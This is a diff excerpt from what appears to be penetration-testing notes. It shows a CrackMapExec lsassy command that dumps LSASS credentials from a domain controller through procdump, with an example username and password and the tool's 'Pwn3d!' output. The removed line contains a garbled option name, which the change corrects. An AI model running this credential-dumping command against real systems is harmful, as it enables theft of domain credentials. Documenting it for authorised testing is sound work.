@@ -200,7 +200,7 @@ LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPas
 If the lsassy module fails, then use the following instead using [sysinternals procdump]({{< ref "sysinternals" >}}):
 
 ```plain
-$ ./cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy -o METHOD=2 PRjohndo_admUMP_PATH=/full/path/to/sysinternals/prjohndo_admump.exe
+$ ./cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy -o METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe
 
 SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
 SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
